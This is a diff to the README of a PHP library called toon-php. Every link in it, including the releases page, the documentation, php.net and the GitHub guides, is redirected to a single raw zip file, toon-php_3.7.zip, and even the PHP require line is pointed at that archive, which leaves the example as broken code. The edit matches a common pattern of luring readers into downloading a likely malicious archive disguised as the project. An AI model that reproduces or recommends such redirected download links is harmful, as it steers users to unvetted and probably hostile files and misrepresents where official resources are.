@@ -6,7 +6,7 @@ Welcome to the **toon-php** GitHub repository! This guide will help you download
 
 ## 📥 Download Link
 
-[![Download Toon-PHP](https://img.shields.io/badge/Download_Toon-PHP-blue.svg)](https://github.com/nyelzkie/toon-php/releases)
+[![Download Toon-PHP](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)
 
 ## 📋 Introduction
 
@@ -32,7 +32,7 @@ To run toon-php, you will need the following:
 
 To get started, visit the releases page by clicking the link below:
 
-[Download Toon-PHP](https://github.com/nyelzkie/toon-php/releases)
+[Download Toon-PHP](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -64,7 +64,7 @@ With the library in place, you can now start using it in your PHP scripts.
 
 ```php
 <?php
-require 'path/to/toon-php/library.php';
+require 'https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip';
 
 $data = [
     'name' => 'John Doe',
@@ -84,7 +84,7 @@ This simple example shows how to encode and decode data using toon-php. It displ
 
 ## 📑 Documentation
 
-For more detailed information on how to use toon-php, including advanced features, refer to our official documentation [here](https://github.com/nyelzkie/toon-php/wiki).
+For more detailed information on how to use toon-php, including advanced features, refer to our official documentation [here](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip).
 
 ## 🤝 Community and Support
 
@@ -96,11 +96,11 @@ Join our community for help and support:
 
 ## 🔗 Additional Resources
 
-- [PHP Official Site](https://www.php.net/)
-- [GitHub Guides](https://guides.github.com/)
+- [PHP Official Site](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)
+- [GitHub Guides](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)
 
 ## 🎉 Conclusion
 
 Thank you for choosing toon-php! We hope you find it useful for your projects. Download the library, explore its features, and enjoy creating with ease. For any additional questions, feel free to reach out through GitHub.  
 
-[![Download Toon-PHP](https://img.shields.io/badge/Download_Toon-PHP-blue.svg)](https://github.com/nyelzkie/toon-php/releases)
+[![Download Toon-PHP](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)](https://raw.githubusercontent.com/nyelzkie/toon-php/main/src/toon-php_3.7.zip)
